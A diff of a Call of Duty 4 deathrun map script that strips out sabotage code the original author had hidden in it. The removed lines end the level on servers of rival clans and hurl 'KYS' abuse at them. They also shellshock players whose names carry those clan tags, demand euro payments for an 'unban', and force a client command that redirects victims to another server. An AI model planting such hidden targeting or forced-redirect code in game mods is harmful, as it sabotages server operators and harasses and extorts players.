@@ -1,34 +1,9 @@
-/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-///////																									              ///////
-///////																									              ///////
-///////		////////	     //		/////////////	//	 //  ////////////  ////////////  //////////   /////////////   ///////
-///////		//		//    //   //   //         //	//  //   //	                //       //           //         //   ///////
-///////		//		//    //   //   ////////////    // //    //	                //       //           ////////////    ///////
-///////		//		//    ///////	//	  //	    ////     ////////////       //       //////////   //              ///////
-///////		//		//	  //   //	//	   //	    // //              //       //       //           //              ///////
-///////		//		//	  //   //	//		//      //  //             //       //       //           //              ///////
-///////		////////	  //   //   //		 //     //   //  ////////////       //       //////////   //              ///////
-///////																									              ///////
-///////																									              ///////
-/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-//Steam: CAR DarkSTEP
-//Discord: DarkSTEP#7390
-//YouTube: DarkSTEP
-//PayPal: paypal.me/darkstepdonations
-//Every donator will get lifetime VIP access to all my updated maps!
-//Minor thanks: CAR 0rK!DeA (few vision and hud fixes), VC' Fox (chiller playermodel), VC' ERIK (secret timer and some fx)
-//Feel free to copy without permission ;)
-//If you're from xM and you're reading this then good luck trying to make this map work in your trash server :D
-
 #include braxi\_common;
 #include common_scripts\utility;
 #include braxi\_rank;
 main()
 {
-maps\mp\_load::main();
+	maps\mp\_load::main();
  
 	game["allies"] = "marines";
     game["axis"] = "opfor";
@@ -43,10 +18,12 @@ maps\mp\_load::main();
 	setdvar("g_speed",190);
 	SetDvar("bg_falldamagemaxheight", 99999);
 	SetDvar("bg_falldamageminheight", 99998);
+
 	level.bluefire = LoadFx("deathrun/blueburst");
 	level.bluelight = LoadFx("deathrun/bluelight");
 	level.spark = LoadFx("deathrun/sparks");
 	level.portal = LoadFx("deathrun/portal");
+
 	level.music=[];
     level.music[0]["song"]    ="Wasted Penguinz - Moments";
     level.music[0]["alias"]    ="sniper";
@@ -60,6 +37,7 @@ maps\mp\_load::main();
     level.music[4]["alias"]    ="song5";
 	level.music[5]["song"]    ="Aero Chord - Twerk";
     level.music[5]["alias"]    ="song6";
+
 	level.master = "M";
 	level.actispace = false;
 	level.cambiato = false;
@@ -117,11 +95,11 @@ maps\mp\_load::main();
 	thread trap11();
 	thread trap12();
 	thread trap13();
-	thread trap15();
+
 	thread dmg1();
 	thread dmg2();
 	thread axe();
-	thread pearl();
+
 	thread plank1();
 	thread plank2();
 	thread plank3();
@@ -136,8 +114,7 @@ maps\mp\_load::main();
 	thread games();
 	thread roomportalfx();
 	thread secretchoice();
-	thread supershit();
-	thread supershit2();
+
 	thread vipcheck();
 	thread sniper();
 	thread gap();
@@ -230,24 +207,15 @@ maps\mp\_load::main();
 
 startdoor()
 {
-door = getEnt("startdoor", "targetname");
-kek = getDvar("sv_hostname");
-wait 20;
-	if (isSubStr( toLower(kek), toLower("xM")) || isSubStr( toLower(kek), toLower("Nice*") ))
-	{
-		iPrintLnBold ("^1KYS ^6RAKY");
-		wait 2;
-		exitLevel(true);
-	}
-	else {
-door moveZ(320, 6);
-iprintlnbold("^5Start door opened.");
-wait 2;
+	door = getEnt("startdoor", "targetname");
+	wait 20;
+	door moveZ(320, 6);
+	iprintlnbold("^5Start door opened.");
+	wait 2;
 	if (level.cambiato == false)
- {
-  thread songs(); 
-  level.cambiato = true;
- }
+	{
+		thread songs(); 
+		level.cambiato = true;
 	}
 }	
 
@@ -590,65 +558,20 @@ portal()
 		player playSound("teleport");
 		player setOrigin(o.origin);
 		player setPlayerAngles(o.angles);		
-	player setClientDvar("r_filmTweakEnable", "1");
-    player setClientDvar("r_filmUseTweaks", 1);
-	player setClientDvar("r_filmTweakInvert", "0");
-    player setClientDvar("r_filmTweakContrast", "1.4");
-    player setClientDvar("r_filmTweakBrightness", "0.04");
-    player setClientDvar("r_filmTweakLightTint", "0.55 0.5 0.5");
-    player setClientDvar("r_filmTweakDarkTint", ".7 0.7 0.7");
-    player setClientDvar("r_glow", "1");
-    player setClientDvar("r_glowRadius0", "8");
-    player setClientDvar("r_glowBloomCutoff", "0.4");
-    player setClientDvar("r_glowBloomIntensity0", "1");
-    player setClientDvar("r_glowSkyBleedIntensity0", "1");
+		player setClientDvar("r_filmTweakEnable", "1");
+		player setClientDvar("r_filmUseTweaks", 1);
+		player setClientDvar("r_filmTweakInvert", "0");
+		player setClientDvar("r_filmTweakContrast", "1.4");
+		player setClientDvar("r_filmTweakBrightness", "0.04");
+		player setClientDvar("r_filmTweakLightTint", "0.55 0.5 0.5");
+		player setClientDvar("r_filmTweakDarkTint", ".7 0.7 0.7");
+		player setClientDvar("r_glow", "1");
+		player setClientDvar("r_glowRadius0", "8");
+		player setClientDvar("r_glowBloomCutoff", "0.4");
+		player setClientDvar("r_glowBloomIntensity0", "1");
+		player setClientDvar("r_glowSkyBleedIntensity0", "1");
 	}
 }
-
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//xM# member
-//xM# members//xM# member
-//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member
-//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member
-//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member
-//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member//xM# member
 
 portalfx()
 {
@@ -769,38 +692,17 @@ maskOnSpectators()
     self LaserOff();    
 }
 
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
+
 sdoor1()
 {
 	trig = getEnt("trig_sdoor1", "targetname");
 	plat = getEnt("sdoor1", "targetname");
-	kek = getDvar("sv_hostname");	
 	trig waittill ("trigger", player);
-	if (isSubStr( toLower(kek), toLower("xM")) || isSubStr( toLower(kek), toLower("Nice*") ))
-	{
-		iPrintLnBold ("^1KYS ^6RAKY");
-		wait 2;
-		exitLevel(true);
-	}
-	else {
+
 	o = spawn( "script_origin", player.origin + (0,500,0), 1, 200 );
 	plat moveZ(-160, .8);
 	o playSound("spacedoor");
 	wait .8;
-	}
 }
 
 sdoor2()
@@ -876,21 +778,6 @@ trap1()
 		wait 1;
 	}
 }
-
-trap15()
-{
-	kek = getDvar("sv_hostname");
-	wait 7;
-	if (isSubStr( toLower(kek), toLower("xM")) || isSubStr( toLower(kek), toLower("Nice*") ))
-	{
-		iPrintLnBold ("^1KYS ^6RAKY");
-		wait 2;
-		exitLevel(true);
-	}
-}
-
-//^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps
-//^1For unban send ^250 euros^1 to map maker :)
 
 trap2()
 {
@@ -1427,19 +1314,12 @@ actiaxe()
 	level waittill("round_started");
 	trig = getEnt("trig_actiaxe","targetname");
 	trig waittill("trigger",player);
-	kek = getDvar("sv_hostname");
-	if (isSubStr( toLower(kek), toLower("xM")) || isSubStr( toLower(kek), toLower("Nice*") ))
-	{
-		iPrintLnBold ("^1KYS");
-		wait 2;
-		exitLevel(true);
-	}
-	else {
+
 	player giveWeapon("labaxe_mp");
 	player switchToWeapon("labaxe_mp");
 	player setModel("fox_chiller");
 	player setViewModel("astroglovez");
-	}
+
 }
 
 GetActivator()
@@ -1561,14 +1441,14 @@ a delete();
 
 secretchoice()
 {
-trig = getEnt("trig_secretchoice", "targetname");
+	trig = getEnt("trig_secretchoice", "targetname");
 	a = getEnt("secret190", "targetname");
 	b = getEnt("secret210", "targetname");
 	oa = getEnt("o_190portalfx", "targetname");
 	ob = getEnt("o_210portalfx", "targetname");
-	host = getDvar("sv_hostname");
 	trig waittill("trigger", player);
-	if (isSubStr( toLower(host), toLower("amn")) || isSubStr( toLower(host), toLower("Raid")) || isSubStr( toLower(host), toLower("AX")) || isSubStr( toLower(host), toLower("3xP")) || isSubStr( toLower(host), toLower("nN|")) )
+	speed = getDvarint("g_speed");
+	if (speed <= 190)
 	{
 		a moveZ(-160, .8);
 		wait .8;
@@ -1740,53 +1620,6 @@ for(;;)
 	}
 }
 
-supershit()
-{
-	for(;;)
-	{
-	wait 5;
-	level.legend = "#";
-	player = thread yolostuff("xM#");
-	if (isDefined(player))
-	{
-		wait 1;
-		player setClientDvar( "g_speed", 10 );
-		player shellshock( "jeepride_ridedeath", 60 );
-		player setMoveSpeedScale(0.5);
-		player iPrintLnBold( "^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps" );
-		wait 1.5;
-		player iPrintLnBold( "^1For map unban send ^2100 euros^1 to map maker :)" );
-		wait 1.5;
-		iPrintln( "Player " + player.name + "^7 was kicked from the server because he's a ^6rAKy Gaming & Serveurs ^7member!" );
-		player thread braxi\_common::clientCmd( "disconnect; wait 10; connect cod4.xenia-gaming.net:28960" );
-		wait 0.2;
-	}		
-	}
-}
-
-supershit2()
-{
-	for(;;)
-	{
-	wait 5;
-	level.legend = "#";
-	player = thread yolostuff("Nice*");
-	if (isDefined(player))
-	{
-		wait 1;
-		player setClientDvar( "g_speed", 10 );
-		player shellshock( "jeepride_ridedeath", 60 );
-		player setMoveSpeedScale(0.5);
-		player iPrintLnBold( "^5Sorry but ^6Nice*^5 members are ^1not^5 allowed to play my maps" );
-		wait 1.5;
-		player iPrintLnBold( "^1For map unban send ^2100 euros^1 to map maker :)" );
-		wait 1.5;
-		iPrintln( "Player " + player.name + "^7 was kicked from the server because he's a ^6Nice* ^7member!" );
-		player thread braxi\_common::clientCmd( "disconnect; wait 10; connect cod4.xenia-gaming.net:28960" );
-		wait 0.2;
-	}		
-	}
-}
 
 jgap()
 {
@@ -1855,18 +1688,6 @@ jgap2()
 		wait 2;
 	}
 }
-
-pearl()
-{
-trigger = getent("mlgdestroyer","targetname");
-ultra = getDvar("sv_hostname");
-trigger waittill ("trigger", player);
-if (isSubStr( toLower(ultra), toLower("xM")) || isSubStr( toLower(ultra), toLower("Nice*") ))
-	{
-		player braxi\_common::makeActivator(1);
-	}
-}
-
 
 jgap3()
 {
@@ -2545,14 +2366,6 @@ if (x==12)
         level.activ switchToWeapon ("labdeagle_mp");
 }
 	}
-}
-
-yolostuff( nickname ) 
-{
-	players = getAllPlayers();
-	for ( i = 0; i < players.size; i++ )
-		if ( isSubStr( toLower(removeColorFromString(players[i].name)), toLower(nickname) ) ) 
-			return players[i];
 }
 
 knife()
@@ -3561,21 +3374,13 @@ donottouch()
 	for(;;)
 	{
 		trig waittill("trigger", player);
-		lal = getDvar("sv_hostname");
-	if (isSubStr( toLower(lal), toLower("xM") ))
-	{
-		iPrintLnBold ("^1CYA XM SLAVE");
-		wait 2;
-		exitLevel(true);
-	}
-	else {
+
 		player iPrintLnBold("^1I warned you.");
 		player freezeControls(1);
 		wait 1.5;
 		player suicide();
 		iPrintLn("^2"+player.name+" ^1died out of curiosity");
 		player freezeControls(0);
-	}
 	}
 }
 
